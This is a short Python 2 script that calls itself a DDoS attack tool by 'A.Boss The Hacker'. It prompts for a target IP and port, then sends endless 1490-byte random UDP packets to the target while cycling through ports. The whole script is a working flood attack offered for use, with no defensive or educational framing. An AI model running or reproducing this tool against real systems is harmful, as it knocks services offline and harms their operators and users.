import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDos Attack BY A.boss The Hacker")
print
print "The Most Powerfull  Tool for "
print "Denial of Service Attack "
print ">>>>>>>>>>>by<<<<<<<<<<<<<<<"
print "# A.Boss The Hacker"
print
ip = raw_input(" Targeted Ip  : ")
port = input("Port no:: ")

os.system("clear")
os.system("figlet flooding the site")
print " "
time.sleep(0)
print ""
time.sleep(0)
print "   Attack Starting"
time.sleep(0)
print ""
time.sleep(2)
print "A.Boss The Hacker"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1

